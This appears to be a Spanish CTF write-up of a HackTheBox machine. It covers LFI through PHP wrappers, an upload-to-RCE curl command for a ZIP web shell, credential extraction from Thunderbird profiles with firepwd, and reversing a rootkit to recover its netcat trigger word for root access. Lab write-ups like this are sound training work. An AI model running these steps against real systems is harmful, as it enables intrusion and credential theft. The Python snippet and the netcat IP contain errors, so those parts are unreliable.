--------
- Tags: #reversing #ghidra #radare2 #lfi #lfi-zip #lfi-wrapper #lfi-to-rce #thunderbird #firefoxpwd #rootkit #python3 
----------
## Técnicas utilizadas
- Local File Inclusion (LFI)  
- LFI - Base64 Wrapper [Reading PHP files]  
- LFI to RCE - ZIP Wrapper  
- Thunderbird - Password Extraction & Reading Messages (firefoxpwd tool)  
- Rootkit - apache_modrootme [GHIDRA/Radare2 Analysis] (Privilege Escalation)
## Procedimiento

![[Pasted image 20230707202809.png]]

#### Reconocimiento
Si lanzamos un **nmap** podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p80 10.10.10.80 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 11:43 MST
Nmap scan report for 10.10.10.80
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Ubuntu))
|_http-title: FBIs Most Wanted: FSociety
|_http-server-header: Apache/2.4.25 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
```

Si lanzamos un **whatweb** podemos ver las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.10.10.80
http://10.10.10.80 [200 OK] Apache[2.4.25], Bootstrap, Cookies[admin], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.25 (Ubuntu)], IP[10.10.10.80], JQuery, Script, Title[FBIs Most Wanted: FSociety], X-UA-Compatible[IE=edge]
```

---------
#### Local File Inclusion (LFI)  
##### LFI - Base64 Wrapper [Reading PHP files]  
En la pagina principal, vemos que se nos asignan 2 **cookies**, una de ellas lleva por nombre **admin** y tiene por valor **0** si intentamos igualarla a **1** y recargamos la pagina podemos ver una opciones nueva en el **nav**:
![[Pasted image 20230709122305.png]]

Podemos encontrar un **LFI** en cual, a través del wrapper **php://filter/convert.base64-encode/resource=$content**podemos leer contenido del servidor:
![[Pasted image 20230709122349.png]]

##### LFI to RCE - ZIP Wrapper 
Si investigamos un poco sobre más wrappers en google, encontramos uno que nos permite ejecutar comandos a traves de un **zip**. Pero primero, para que esto se pueda a contecer, debermos de poder subir algun archivo con la estructura de una **web shell.** Si listamos el codigo que logramos obtener del **LFI** vemos que cuando mandamos un mensaje en la sección de **upload**, se guarda en el directorio con el nombre de nuestra **iP**:
![[Pasted image 20230709122420.png]]

Procedemos a crear un mensaje con la estructura basica de una **web shell**:
```ruby
curl -s -X POST "http://10.10.10.80/?op=upload" -F "tip=<cmd.zip" -F "name=Name" -F "token=24f7e31e264abe61e91418654c7f952a5338278691c3fc30f9ed69186d9f4903" -F 'submit=Send Tip!' -H 'Cookie: PHPSESSID=c8sd08fuhlutako3ce2dtpgtp4; admin=1'
```
![[Pasted image 20230709123831.png]]

Y ahora si consultamos el archivo tal y como se nos dice en la pagina, podemos observar el output del comando ejecutado a nivel de sistema:
![[Pasted image 20230709123911.png]]

---------------------
#### Thunderbird - Password Extraction & Reading Messages (firefoxpwd tool)  

Vemos una carpeta algo inusual de nombre **Thunderbird**, estas suelen corresponder a sesiones de **FireFox**. Dentro de esta carpeta suelen existir ciertos archivos que nos permiten muchas veces ver credenciales en texto claro y otra veces podemos utilizar una herramienta como [FireFoxPwd tool](https://github.com/lclevy/firepwd) para desencryptar archivos y poder ver las credenciales en texto legible. Para poder lograr esto, debemos disponer de 2 archivos, por un lado la **key.db** y por otro lado un archivo json de nombre **logins.json**:
![[Pasted image 20230709124606.png]]

Podemos transferirnos a nuestro equipo estos dos archivos y hacer lo siguiente:
```
# mv {key.db,logins.json} firepwd; python3 firepwd.py
```

Y esto automaticamente nos dumpeara las contraseñas encryptadas que existan en estos archivos. Podemos observar que ahora pertenecemos al groupo **ADM** que nos permite leer **logs del sistema**.

-----------
#### Rootkit - apache_modrootme [GHIDRA/Radare2 Analysis] (Privilege Escalation)
Una vez como el nuevo usuario, podemos intentar ahora listar correos existentes en la carpeta **ThunderBird**, ya que estos se suelen almacenar en *./ImapMail/-Domain-/mails* y podemos ver que existen algunos, hay uno que llama la atencion y dice lo siguiente:
```
Image Mail Elliot
```

Basicamente el correo nos habla de que en el sistema existe un **RootKit**, y nos brindan el nombre del posible binario, si aplicamos algunos filtros para encontrar el binario podemos encontrar el siguiente resultado:
```
# locate rootme
```

Una vez encontramos el posible **RootKit**, podemos proceder a mandarlo a nuestro equipo para posteriormente hacerle **Reversing** con **Ghidra**

--------
#### Rootkit - apache_modrootme [GHIDRA/Radare2 Analysis] (Privilege Escalation)
Buscando por funciones llamativas, encontramos una de nombre:
![[Pasted image 20230709130953.png]]

Esta su vez hace una llamada a una funcion con nombre **DarkArmy**:
![[Pasted image 20230709131018.png]]

En la funcion **DarkArmy** podemos ver el valor de la cadena, el valor final, es el equivalente de una cadena que tira de XOR contra la palabra **HackTheBox**, podemos usar **Radare2** para ver mas claro a lo que se refieren los numeros hexadecimales, tendriamos que aplicar el siguiente comando:
```
radare2 > px @0x0000101bf2
```

y podemos ver  de mejor manera contra que se esta aplicando el **XOR**:.
![[Pasted image 20230709131405.png]]

Ahoora con esta cadena, podemos aplicarle un tratamiento con **Python** interactivo:
```
>> cadena1 = bytearray(b"\x0e\x14\0xd\x38\x3b\x0b\x27\x1b\x01")
>> cadena2 = bytearrary(b"HackTheBox")
>> cadena_final = ""
>> for i in range(0,10):
>> 	cadena_final += chr(cadena1[i] ^ cadena2[i])
>> 	
>> print(cadena_final)
FunSociety
```

Ahora podemos conectarnos con **Netcat** y proporcionar la palabra para activar el **RootKit**:
```netcat
nc 10.10.10.10 80
GET FunSociety
rootme-0.5 DarkArmy Edition Ready
Whoami
root
```



